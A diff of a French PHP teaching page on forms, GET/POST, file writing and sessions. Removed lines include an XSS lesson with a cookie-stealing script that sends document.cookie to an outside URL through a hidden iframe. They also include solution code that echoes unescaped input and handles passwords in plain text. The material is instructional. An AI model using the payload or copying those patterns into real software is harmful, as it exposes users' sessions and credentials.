@@ -199,6 +199,20 @@
 		   font:normal 1em calibri light;
 		   color:#990099;
 		}
+		
+		.retenir{
+			border:1px solid #8c8b8b ; 
+			padding:.5em; 
+			border-radius:0 0 3px 3px; border:none;											
+			box-shadow:0.2px 2px 16px 0px #8c8b8b; 
+			width:96.5%;
+			background:white;
+			color:#990033;
+			margin-bottom:1em;
+	    }
+		.calibri{
+		    font-family:calibri light;
+		}
 	
         
         		
@@ -636,251 +650,45 @@ setcookie('nom', "Joseph", time()+3600*24*7);
 				
 				<div class="success_ structureSujet ">
 					<p><u><a href="#"><strong>Exo2:</strong> Sauvegarde sur fichier </a></u></p>
-                    <span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9312;</small> &emsp; Affichage &emsp; <i style="color:#115;">ligne par ligne</i> </b></span><br>
-					&emsp;Ajouter un fichier "<b>form.php</b>" qui permet &agrave;  l'internaute
-					d'entrer <br>							
-				    <span style="line-height:2em"> &emsp;&nbsp;&nbsp;son <b>Nom</b>, son <b>Pr&eacute;nom</b>, et son <b>password</b>:</span>
-                    
+                    <span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9312;</small> &emsp; Stockage &emsp; <i style="color:#115;">ligne par ligne</i> </b></span><br>
+					&emsp;Reprendre le fichier corps.php | en faisant une copie <b>corpsFic.php</b>							                 
 					<ul type="disc" class="questions_" >
-                         <li>Méthode: <b>GET</b> </li>					
-						 <li>Le <u>traitement</u> et <u>l'affichage</u> se font dans <b>corps.php</b></li>						 
-						 <li>Dedans i fo un lien vers <b>form.php</b> </li>
+                         <li>Enregistrer les noms et prenoms dans le fihier nomInternaute.txt</li>					
+						 <li>Chaque couple doit occuper une ligne</li>						 
+						 <li>Séparer le couple par un virgule</li>
 					</ul>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-<pre><code class="language-html" ><source lang="html">
-/********  form.php ******/
-&lt;!DOCTYPE html>
-&lt;html>
-&lt;head>
-	&lt;title>TP2: Exercice2&lt;/title>
-&lt;/head>
-&lt;body>
-	&lt;form action="corps.php" method="get">
-		Nom :     &lt;input type="text"     name="nom">
-		Prénom:   &lt;input type="text"     name="prenom">
-		Password: &lt;input type="password" name="password">		
-	    &lt;input type="submit" name="submit" value="Envoyer">
-	&lt;/form>
-&lt;/body>
-&lt;/html>	
-</source></code></pre>
-<pre><code class="language-php" ><source lang="php">
-/********  corps.php ******/
-&lt;div id="contenu">
-	&lt;h3> TP2: Exercice1&lt;/h3>
-&lt;/div>
-&lt;?php  
-   // COLLECT 
-   $nom = $_GET["nom"];
-   $prenom = $_GET["prenom"];
-   $password = $_GET["password"];
-   
-  // AFFICHAGE
-   echo '
-	  &lt;p>Nom:          '.$nom.'     &lt;/p>
-	  &lt;p>Prénom:       '.$prenom.'  &lt;/p>
-	  &lt;p>Mot de passe: '.$password.'&lt;/p>        
-   ';
-?>
-&lt;p>&lt;a href="form.php"> Formulaire de saisie &lt;/a>&lt;/p>	
-</source></code></pre>
-					</details>
-					<p></p>	
-
-					&emsp;Que se passe-t-il au niveau de l'URL, lors du passage des paramètres ?<br>							
-				    <span style="line-height:2em"> &emsp;&nbsp;&nbsp; (<b>Nom</b>, <b>Pr&eacute;nom</b>, <b>password</b>)</span>
-                    
-
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 <div class="paragraphe">
-						     On y voit leurs valeurs
-						 </div>
-					</details>
-					<p></p>	
-                    <span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9313;</small> &emsp; Affichage &emsp; <i style="color:#115;">dernier enregistrement</i> </b></span><br>
-					&emsp;Avant d'afficher les paramètres transmis, <b> vérifier</b><br>
-					<ul type="disc" class="questions_" >
-                         <li>S'ils sont bien positionnés[ <b>isset()</b> et <b>empty()</b> ] </li>					
-						 <li>Sinon afficher un message d'erreur</li>						 
-					</ul>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-<pre><code class="language-php" ><source lang="php">
-/********  corps.php ******/
-
-&lt;div id="contenu">
-	&lt;h3> TP2: Exercice1&lt;/h3>
-&lt;/div>
-&lt;?php  
-   // COLLECTE 
-	   
-   $nom = isset($_GET["nom"]) ? $_GET["nom"] : '';
-   if(empty($nom))echo 'Entrer votre nom &lt;br>';
-   
-   $prenom = isset($_GET["prenom"]) ? $_GET["prenom"] : '';
-   if(empty($prenom)) echo 'Entrer votre prenom &lt;br>';
-   
-   $password=isset($_GET["password"]) ? $_GET["password"] : '';
-   if(empty($password)) echo 'Entrer votre password &lt;br>';
-   
-  // AFFICHAGE
-  
-   echo '
-	  &lt;p>Nom:          '.$nom.'     &lt;/p>
-	  &lt;p>Prénom:       '.$prenom.'  &lt;/p>
-	  &lt;p>Mot de passe: '.$password.'&lt;/p>        
-   ';
-?>
-&lt;p>&lt;a href="form.php"> Formulaire de saisie &lt;/a>&lt;/p>	
-</source></code></pre>
-					</details>
-					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9314;</small> &emsp; GET : &emsp; <i style="color:#115;">trasmission, récuperation, et affichage <small style="color:gray">( des données )</small></i> </b></span><br>
-					&emsp;Ajouter dans le formulaire<br>
-					<ul type="disc" class="questions_" >
-                         <li >4.1 Un champs <b>puniton</b>(string)</li>
-                         <li >4.2 Un champs <b>nbFois</b>(int): 10 par défaut</li>
-                         <li >4.3 Modifier <b>corps.php</b> pour qu'il affiche "la punition" <b>nbFois</b></li>
-                         <li >4.4 V&eacute;rifier si  <b>nbFois</b> est bien un entier(en le castant)</li>
-                         <li >4.5 Limiter <b>nbFois</b> à 100</li>
-                         <li >4.6 <span style="color:#990033">Quel danger pour le passage des pramètres</span>(au niveau de l'URL) </li>						 						 
-					</ul>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-<pre><code class="language-html" ><source lang="html">
-/********  form.php ******/
-    ...  	
-Punition : &lt;input type="text" name="punition"  >
-nbFois:    &lt;input type="number" name="nbFois" value="10" >
-	
-</source></code></pre>
-<span class="idS t-transparent" > &nbsp; Pour éviter les erreurs: Traiter séparement avant de concatener  &nbsp;&nbsp;<b class="attention" >&#9888;</b></span>
-<pre><code class="language-php" ><source lang="php">
-/********  corps.php ******/  	
-&lt;?php  
-  // COLLECTE 
-  ...  
-  $punition=isset($_GET["punition"]) ? $_GET["punition"] : '';
-  if( empty($punition) ) echo 'Saisir la punition&lt;br>';
-  
-  // AFFICHAGE  
-  ...	
-  $n = 1;
-  while( $n &lt;= 10 ){
-	   echo $punition.'&lt;br/>';
-	   $n++; 
-	}
-?>
-&lt;p>&lt;a href="form.php"> Formulaire de saisie &lt;/a>&lt;/p>	
-</source></code></pre>					
-					<span class="idS subQuestion t-transparent"> &nbsp;<b style="color:gray">&bull;</b>&emsp; 4.3&emsp; Modifier <b>corps.php</b> pour qu'il affiche "la punition" <b>nbFois</b></span>
-<pre><code class="language-php" ><source lang="php">
-/********  corps.php ******/
-    ...  	
-&lt;?php  	
-	$n = 1;
-	while( $n &lt;= $nbFois ){
-		echo $punition.'&lt;br/>';		
-		$n++; 
-	}
-?>	
-</source></code></pre>
-					<span class="idS subQuestion t-transparent"> &nbsp;<b style="color:gray">&bull;</b>&emsp; 4.4&emsp; V&eacute;rifier si  <b>nbFois</b> est bien un entier(en le castant)</span>
-<pre><code class="language-php" ><source lang="php">
-/********  corps.php ******/
-&lt;?php 
-   $nbFois=isset($_GET["nbFois"]) ? (int) $_GET["nbFois"] : ''; 
-?>	
-</source></code></pre>
-					<span class="idS subQuestion t-transparent"> &nbsp;<b style="color:gray">&bull;</b>&emsp; 4.5&emsp; Limiter <b>nbFois</b> à 100</span>
-<pre><code class="language-php" ><source lang="php">
-/********  corps.php ******/
-&lt;?php 
-    ...  	
-	$n = 1;
-	while( $n &lt;= $nbFois ){
-		if($nbFois &lt;= 100 ){ echo $punition.'&lt;br/>';}			 			 
-		else{  echo 'Nombre trop grand '; break;    }		 
-		$n++;					
-	}
-?>	
-</source></code></pre>
-					<span class="idS subQuestion t-transparent"> &nbsp;<b style="color:gray">&bull;</b>&emsp; 4.6&emsp; <span style="color:#990033">Quel danger pour le passage des paramètres</span>(au niveau de l'URL)</span>
-					<div class="paragraphe">
-						N'importe qui peut modifier les paramètres(voir même les supprimer <span style="color:red">&#9760;</span> )
-						dans la barre d'adresse de son navigateur !
-					</div>
-					</details>
-					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9315;</small> &emsp; POST: &emsp; <i style="color:#115;">trasmission, récuperation, et affichage <small style="color:gray">( des données )</small></i> </b></span><br>
-					&emsp;Dupliquer <b>form.php</b> en <b>form.1.php</b><br>
-					<ul type="disc" class="questions_" >
-                         <li>Dans <b>form.php</b>: Remplacer <b>GET</b> par <b>POST</b> </li>					
-						 <li>Qu'est-ce qui change ?</li>						 
-					</ul>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 <div class="paragraphe">
-						    &#8718; On ne voit pas les données(<small>du formulaire</small>) dans la barre d'adresse<br>
-							&#8718; Je les r&eacute;çois dans une table <b>$_POST[ ]</b>
-						 </div>
-					</details>
-					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9316;</small> &emsp; Failles XSS &emsp; <i style="color:#115;">Injection de code HTML/JS</i> </b></span><br>
-					&emsp;<b style="line-height:1.5em">Vulnérabilté  du fichier traitement</b>(corps.php)<p></p>
-					&emsp;Il peut être appelé par n'importe quelle page( pas seulement form.php)
-					
-					
-					<ul type="disc" class="questions_" >
-					     <li>Quelle conséquence ?! </li>
-						 <li>Et si on met du code HTML dans le champs <b>nom</b> !</li>
-						 <li>Et si on y gave du javascript !! </li>		
-					</ul>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 <div class="paragraphe" style="margin-bottom:0.4em !important;">
-						    <ul type="square">
-							   <li><b>Conséquence</b>: Modifier son contenu pour "passer" le formulaire de login </li>
-							   <li><b>Injection HTML</b>: Une balise &lt;a&gt; pour rediriger l'utilisateur vers un autre site qui réaffiche la valeur du champs <b>Nom</b></li>
-							   <li><b>Injection javaScript</b>: Voler le cookie contenant les paramètres de connexion( en utilisant une rédirection javaScript)</li>
-							</ul>							
-						 </div>
-						 <span class="idS subQuestion t-transparent" style="margin-top:0 !important;; background:#d2f2df !important;">&nbsp;&nbsp;Exemple de vol de cookie par injection javaScript</span>
-<pre><code class="language-html" ><source lang="html">
-&lt;script>
-     document.write('&lt;iframe src="https://www.lije-creative.com/volersession.php?'+ 
-	 document.cookie + '" height="0" width="0" style="border:none;" />');
-&lt;/script>	
-</source></code></pre>
-					</details>
-					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9317;</small> &emsp; Fonctions &emsp; <i style="color:#115;"><b>html<span style="color:#990033">special</span>chars()</b>,&emsp; <b><span style="color:#990033">strip_tags()</span></b></i> </b></span><br>
-					&emsp;Comment résoudre le problème précédent ?<br>
-					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
 					    <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						<ul type="none" class="questions_" style="padding-left:2.8em;" >
-							 <li>
-							     &#9193; &Eacute;chapper le code HTML transmis : fonction&emsp; <b>html<span style="color:#990033">special</span>chars()</b><br>
-								 &emsp; Tester cette fonction
-							 </li>
-
-							 <li>
-							     &#9193; Supprimer les balise HTML du champs : fonction&emsp; <b><span style="color:#990033">strip_tags()</span></b><br>
-								 &emsp; Tester &eacute;galement cette fonction
-							 </li>		
-						</ul>
+						<p class="retenir calibri" style=><b class="maron">&dollar;nom </b><b class="retenir black">=</b> isset( &dollar;_GET["nom"] )<b class="retenir black">?</b>&dollar;_GET["nom"] <b class="retenir black">:</b> ' ' ; </p>				
+						<p class="retenir calibri"><b class="maron">&dollar;prenom </b><b class="retenir black">=</b> isset( &dollar;_GET["prenom"] )<b class="retenir black">?</b>&dollar;_GET["prenom"] <b class="retenir black">:</b> ' ' ; </p>				
+						<p class="paragraphe calibri" style="color:black;  margin-top:0;">					
+						    &dollar;fichier=fopen("nomInternautes.txt",<b style="color:red">"a+"</b>);
+							<br>&dollar;ligne = <b class="maron">&dollar;nom </b>.", ".<b class="maron">&dollar;prenom </b>."\r\n";
+							<br>echo fwrite(&dollar;fichier, &dollar;ligne);
+							<br>fclose(&dollar;fichier); 					
+						</p>					
+					</details>
+					<p></p>	
+					
+                    <span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9313;</small> &emsp; Stockage &emsp; <i style="color:#115;">dernier enregistrement</i> </b></span><br>
+					&emsp; Reprendre le fichier corpsFic.php | en faisant une copie <b>corpsFic2.php</b>
+					<ul type="disc" class="questions_" >
+                         <li>Modifier la façon de sauvegarder chaque couple (nom, prenom) </li>					
+						 <li>Il faut à chaque fois écraser l’ancien couple</li>
+						 <li>&#9888; Indication: <span class="calibri">i suffit de placer le pointeur en début de fichier !</span></li>
+						 
+					</ul>
+					<details>
+					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
+                         <p class="paragraphe calibri" style="color:black;  margin-top:0; width:auto;">					
+						    &dollar;fichier=fopen("nomInternautes.txt",<b style="color:red">"w+"</b>);					
+						</p>	
 					</details>
 					<p></p>
-
-					
+															
 				</div>
 				
-				
-				
-				
+						
 				
                 <!-- ######################   Exercice3 ################################# -->
 				
@@ -888,7 +696,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 				
 				
 				<div class="danger_ structureSujet">
-					<p><u><a href="#"><strong>Exo3:</strong> Prot&eacute;ger une page par mot de passe</a> </u> &emsp;strcmp() </p>					
+					<p><u><a href="#"><strong>Exo3:</strong> les captcha</a> </u>  </p>					
 					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9312;</small> &emsp; HTML: &emsp; <i style="color:#115;">Saisie <small style="color:gray">( interface d'entrée )</small></i> </b></span><br>
 					&emsp;Ajouter une page <b>form<span style="color:#a1008c">ulaire</span>.php</b> contenant:<br>
 					<ul type="disc" class="questions_" >
@@ -1007,324 +815,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 				
 				
 				
-				
-				
-				<div class="info_ structureSujet">
-					<p><u><a href="#"><strong>Exo4:</strong> Variables superglobales(les sessions)</a></u></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9312;</small> &emsp; Variable &emsp; <i style="color:#115;">SUPERGLOBALE</i> </b></span><br>
-					&emsp;Qu'est-ce qu'une variable superglobale ?<br>
-					<span style="line-height:1.5em; color:transparent;">...</span>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 <div class="paragraphe petitParagraphe">
-						     Variable  accessibles n’importe où dans le script: &Agrave; l'intéieur des fonction(contexte locale) et à l'extérieur des fonctions(contexte global). <br><br>
-							 <small>C'pas moi qui défini cette variable! Elle existe déjà prédéfinie dans le moteur PHP</small>
-						 </div>
-					</details>
-					<p></p>
-					
-					&emsp;Les principales sont:<br>
-					<ul type="square" class="questions_" >
-                         <li>&dollar;_SERVER</li>
-                         <li>&dollar;_ENV</li>
-						 <li>&dollar;_SESSION</li>
-						 <li>&dollar;_COOKIES</li>
-						 <li>&dollar;_GET, &dollar;POST</li>
-						 <li>&dollar;_FILE</li>
-						 <li><b>En dire deux mots ...</b></li> 						  
-					</ul>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 <div class="paragraphe moyenParagraphe">
-						    <ul type="square" class="questions_" >
-								 <li><b>&dollar;_SERVER : Variables définies par le serveur </b> </li>
-								 <ul type="disc">
-								    <li>$_SERVER['<b style="color:#990033">PHP_SELF</b>'] &equiv; fichier(<small style="color:gray"> qui contient le script</small>)</li>
-									<li>$_SERVER['<b style="color:#990066">SERVER_NAME</b>'] &equiv; serveur(<small style="color:gray"> qui héberge le fichier</small>)</li>
-									<li>$_SERVER['<b style="color:#660033">SERVER_ADDR</b>'] &equiv; serveur(<small style="color:gray"> qui héberge le fichier</small>)</li>
-									<li>$_SERVER['<b style="color:#990099">REMOTE_ADDR</b>'] &equiv; @IP(<small style="color:gray"> du visiteur </small>)</li>
-									<li>$_SERVER['<b style="color:#660066">REQUEST_TIME</b>']&equiv; durée(<small style="color:gray"> de la requête</small>)</li>
-								 </ul>
-								 <li><p></p><b>&dollar;_ENV : Environnement où s'exécute le script </b> </li>
-								 <ul type="disc">				 
-									 <li>
-										$_ENV['<b style="color:#660033">USER</b>'] &equiv; visiteur(<small style="color:gray"> qui éxecute le script </small>)
-									 </li>
-								 </ul>
-								 <li>
-								    <p></p><b>&dollar;_FILE : Va contenir des informations sur un fichier téléchargé !</b><br>
-									<span style="color:#555">On pourra donc utiliser cette superglobale lorsqu’on offre la possibilité à nos utilisateurs de nous envoyer des fichiers.</span>
-								 </li>	
-                                 <ul type="disc">
-								     <li>Ce, afin d’obtenir des informations sur les fichiers envoyés au serverveur web( type du fichier, sa taille, son nom, ... etc ) </li>
-									 <li>ou même pour filtrer et interdire l’envoi de certains fichiers</li>
-								 </ul>								 
-								 <li><p></p><b>&dollar;_SESSION: &emsp;</b> <span style="color:#666">Transmissions de donnéees entre pages</span></li>
-								 <li><b>&dollar;_GET : &emsp;&emsp;&emsp;</b> <span style="color:#777">Transmissions de donnéees entre pages</span></li>
-								 <li><b>&dollar;_POST : &emsp;&emsp;&nbsp;&nbsp;</b> <span style="color:#888">Transmissions de donnéees entre pages</span></li>                               
-								 <li>
-								    <p></p>
-								    <b>&dollar;_COOKIES</b>
-									<div class="paragraphe petiPragraphe" style="padding:0 0 0 1.5em; padding-top:0; margin-top:0; border:none;">
-									    Un cookie est un fichier qui est déposé par votre navigateur sur votre ordinateur lorsque vous surfez sur Internet. 
-										<hr width=60% size=1><b><i style="calibri ligh; font-size:1.2em;"><small>Ce fichier sert à stocker et récupérer des informations sur vos habitudes de navigation</small></i></b>
-										<hr width=60% size=1>C'est le navigateur qui va enregistrer le fichier sur votre disque dur(car le serveur n'a pas accès directement à votre ordinateur)
-									</div>
-								 </li>								 								 
-					        </ul>
-							
-						 </div>
-					</details>
-					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9313;</small> &emsp; Valeur &emsp; <i style="color:#115;">REMOTE_ADDR</i> </b></span><br>
-					&emsp;&Agrave; quoi sert la valeur contenu dans <b>&dollar;_SERVER['<span style="color:#f44336;">REMOTE_ADDR</span>']</b> ?<br>
-					<span style="line-height:1.5em; color:transparent;">...</span>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 <div class="paragraphe petitParagraphe">
-						    @IP du visiteur qui demande la page
-						 </div>
-						 
-					</details>
-					<p></p>
-					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9314;</small> &emsp; Variable &emsp; <i style="color:#115;">&dollar;_SESSION</i> </b></span><br>
-					&emsp;3.1 &Agrave; quoi sert la variable <b>&dollar;_SESSION</b> ?<br>
-					<span style="line-height:1.5em; color:transparent;">...</span>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 <div class="paragraphe petitParagraphe">
-						    Pour conserver des variables sur toutes les pages du site et pendant toute la durée de présence de
-                            l’internaute, on utilise les sessions (plus facile qu’avec GET ou POST).
-							<b><br>
-							  Normalement, la session est détruite ou à la <u>fermeture du navigateur</u>, ou au bout de <u>30 minutes</u>. Cette valeur peut être modifiée dans le fichier php.ini du serveur.
-							</b><br>
-							Les informations sont stockées dans des fichiers sur le serveur. &Agrave; chaque session correspond un fichier.
-						 </div>
-					</details>
-					<p></p>
-					
-					&emsp;3.2 Ajouter un fichier <b>login.php</b> contenant 3 variables session:<br>
-					<ul type="square" class="questions_" >
-						 <li>&dollar;_SESSION['<span style="color:gray">nom</span>']</li>
-						 <li>&dollar;_SESSION['<span style="color:gray">prenom</span>']</li>
-						 <li>&dollar;_SESSION['<span style="color:gray">motPasse</span>']</li>
-						 <li><b>login.php</b> est accessible par un lien depuis <b>corps.php</b> </li> 						  
-					</ul>
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-<pre><code class="language-php" ><source lang="php">
-/********  login.php ******/
-&lt;?php  
-  session_start();
-  
-  $_SESSION['nom'] = "nom";
-  $_SESSION['prenom'] = "prenom";
-  $_SESSION['motPasse'] = "motPasse";	
-?>
-</source></code></pre>	
-					</details>
-					<p></p>
-					
-					&emsp;3.3 Reprendre le fichier <b>index.php</b> qui, maintenant appelle:<br>
-					<ul type="square" class="questions_" >
-						 <li>entete<span style="color:gray">.php</span></li>
-						 <li>login<span style="color:gray">.php</span></li>
-						 <li>piedPage<span style="color:gray">.php</span></li>
-						 <li>Comme le montre la figure suivante: </li> 						  
-					</ul>
-					<ul type="none" class="questions_" >
-					  <li><img src="index.png" class="img"/></li>
-					</ul>
-					<details>
-					<summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-<pre><code class="language-php" ><source lang="php">
-/********  login.php ******/
-&lt;?php  
-    include 'entete.php';
-    include 'login.php';
-    include 'piedPage.php';	
-?>
-</source></code></pre>	
-					</details>
-					<p></p>
-
-					&emsp;3.4 Reprendre la page <b>login.php</b> qui, maintenant:<br>
-					<ul type="square" class="questions_" >
-					  <li>Pointe sur elle-même.</li>
-					  <li>Ajouter un lien vers <span style="color:#990033">infos.php</span></li>
-					</ul>
-					<details>
-					<summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-<pre><code class="language-php" ><source lang="php">
-/********  login.php ******/
-&lt;?php session_start(); ?>
-
-&lt;!DOCTYPE html>
-&lt;html>
-&lt;head>
-	&lt;title>TP2: Exercice4&lt;/title>
-&lt;/head>
-&lt;body>
- &lt;h3>Travail sur les sessions&lt;/h3>
- &lt;p> Merci de saisir vos coordonnées </p>
- &lt;form action="" method="post">		 
-    &lt;p> Nom&amp;emsp;:&lt;input type="text" name="nom">&lt;/p>
-    &lt;p> Prénom:&lt;input type="text" name="prenom">&lt;/p>
-    &lt;p> Pass:&lt;input type="password" name="motPass">&lt;/p>
-    &lt;p> &lt;input type="submit" name="submit" value="Accéder">&lt;/p>
-    &lt;input type="button" value="Infos ..."
-	       onclick="window.location.href='infos.php';" />	
- &lt;/form>
-&lt;/body>
-&lt;/html>
-
-&lt;?php 
-//La page pointe sur elle mm => on utilise la grosse boucle 
- if(isset($_POST['nom']) && !empty($_POST['nom'])){
-   $_SESSION['nom'] = $_POST['nom'] ;
-   $_SESSION['prenom'] = $_POST['prenom'] ;
-   $_SESSION['motPasse'] = $_POST['motPasse'] ;
- }
-?>
-</source></code></pre>	
-					</details>
-					<p></p>
-					&emsp;3.5 Dans <span style="color:#990033">infos.php</span> :<br>
-					<ul type="square" class="questions_" >
-					  <li>Afficher les 3 variables session.</li>
-					  <li>Est-ce que <span style="color:#990033">infos.php</span> les voit bien?</li>
-					  <li>Ajouter un lien de "Déconnexion" qui ramène l’internaute à la page index.php et qui supprime la session</li>
-					  <li><b style="font-size:1em"><u>Indications</u></b>:</li>
-					</ul>
-
-					<ul type="none" class="questions_" style="margin-left:-1em; line-height:0.9 !important; " >
-			
-					  <li class="paragraphe petitParagraphe" style="background:#dbe7fe !important; margin-top:0; margin-bottom:0; ">
-					     Pour ce faire, il faut une page de déconnexion intermédiaire (logout.php)
-                         qui<br> -  va d’abord appeler la fonction unset($ SESSION)<br> - avant session destroy()
-					  </li>
-		
-					  <li class="paragraphe petitParagraphe indication" style="margin:top:0; margin-left:-2em;">
-					     L’appel à index.php se fait grâce à header(’Location: index.php’)
-					  </li>
-					  <li class="paragraphe petitParagraphe indication" style="margin-left:-2em;" >
-					    header(’Location: index.php’)  permet de rediriger le navigateur 
-					  </li>
-					</ul>
-					
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-<pre><code class="language-php" ><source lang="php">
-/********  infos.php ******/
-&lt;?php  
-   session_start(); 
-   
-   echo $_SESSION['nom'].'&lt;br>' ;	   
-   echo $_SESSION['prenom'].'&lt;br>' ;
-   echo $_SESSION['motPasse'].'&lt;br>';
-?>
-&lt;p>&lt;a href="logout.php"> Déconnexion &lt;/a>&lt;/p> 
-</source></code></pre>
-
-<pre><code class="language-php" ><source lang="php">
-/********  logout.php ******/
-&lt;?php  
-   session_start(); 
-   
-   if(isset($_SESSION['nom']) && !empty($_SESSION['nom'])){
-	   unset($_SESSION['nom']); 
-	   unset($_SESSION['prenom']);
-	   unset($_SESSION['motPasse']);
-	   session_destroy(); 
-    }  
-   header('Location:index.php');
-?>
-</source></code></pre>
-					</details>
-					<p></p>
-					&emsp;3.6 Dupliquer <span style="color:#990033">infos.php</span> en info2.php<br>
-					<ul type="square" class="questions_" >
-					  <li>Ajouter  dans login.php un lien vers la page infos2.php</li>
-                      <li>
-					        infos2.php va déconnecter l’utilisateur au bout de 30 secondes
-							et afficher "Vous avez été déconnecté" 
-					  </li>
-					  <li>
-					        Ensuite, si la session existe encore (donc avant l’écoulement des 30 secondes),
-                            il faut afficher les informations de session (nom, prénom)
-					  </li>                          							
-					  <li><b style="font-size:1em"><u>Indications</u></b>:</li>
-					</ul>
-					<ul type="none" class="questions_" style="margin-left:-1em; line-height:0.9 !important;" >			
-			
-						  <li class="paragraphe petitParagraphe indication" style="margin:top:0; margin-left:-2em;">
-							  Pour tester, vous pouvez rafraichir la page avant 30 secondes,
-                              puis attendre 30 secondes et rafraichir de nouveau.
-
-						  </li>
-						  <li class="paragraphe petitParagraphe indication" style="margin-left:-2em;" >
-							  Vous devriez voir apparaître le
-                              message "Vous avez été déconnecté" la deuxième fois
-						  </li>
-					</ul>
-					
-					<ul type="square" class="questions_" >                         							
-					  <li><b style="font-size:1em"><u>Nota bene</u></b>:</li>
-					</ul>
-					
-					
-					<ul type="none" class="questions_" style="margin-left:-1em; line-height:0.9 !important;" >
-						  
-						  <li class="paragraphe petitParagraphe notaBene"><!-- avant c't background:#d2f2df, après g mis white   -->
-							  Pour faire la déconnexion automatique, servez vous de cette page :
-							  <small><code>https://stackoverflow.com/questions/520237/how-do-i-expire-a-php-session-after-30-minutes</code></small>
-							  avec le code :
-<pre><code class="language-php" ><source lang="php">
-if (isset($_SESSION[’LAST_ACTIVITY’]) && (time() - $_SESSION[’LAST_ACTIVITY’] > 30)){
-session_unset(); 
-session_destroy(); 
-}
-// Met à jour le timeStamp de la dernière activité
-$_SESSION[’LAST_ACTIVITY’] = time(); 
-</source></code></pre>
-						  </li>
-					</ul>
-					
-					<details>
-					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-<pre><code class="language-php" ><source lang="php">
-/********  login.php ******/
-... 
-&lt;?php 
-  if(!isset($_SESSION['LAST_ACTIVITY']) && empty($_SESSION['LAST_ACTIVITY'])){
-	$_SESSION['LAST_ACTIVITY'] = time();  
-  }
-?>
-</source></code></pre>
-<pre><code class="language-php" ><source lang="php">
-/********  info2.php ******/ 
-&lt;?php 
-    session_start(); 
-    // Ce if car après la déconnexion i veut pas de variables vides
-	if (!empty($_SESSION['nom'])){ 
-		echo $_SESSION['nom'].'&lt;br>' ;	   
-		echo $_SESSION['prenom'].'&lt;br>' ;
-		echo $_SESSION['motPasse'].'&lt;br>';    	
-	    echo '&lt;p>&#9200; Actualiser pour voir la durée de votre session:&lt;b>'.(time() - $_SESSION['LAST_ACTIVITY']).' S&lt;/b>&lt;/p>';
-	}	
-	//Logout   
-   	if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > 30)) {
-        session_unset(); 
-        session_destroy(); 
-        echo '&lt;p>&lt;span style="color:red">&#9200;&lt;/span> Vous êtes déconnecté !&lt;/p>' ;			
-	} 
-?>
-&lt;p>&lt;a href="index.php" style="text-decoration:none;"> &#9194; Connexion &lt;/a>&lt;/p>
-</source></code></pre>		
-					</details>
-					<p></p>
-					
-				  </div>				  
+			  
 			</section> <!-- FIN section1- conteneurDesSujet - PHP -->
 		</main>
 		
